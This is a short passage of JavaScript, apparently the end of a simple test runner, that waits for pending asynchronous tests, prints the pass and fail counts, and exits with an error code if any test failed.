  if (asyncPending > 0) { setTimeout(finish, 5); return; }
  console.log(pass + ' passed, ' + fail + ' failed');
  if (fail) process.exit(1);
}
finish();
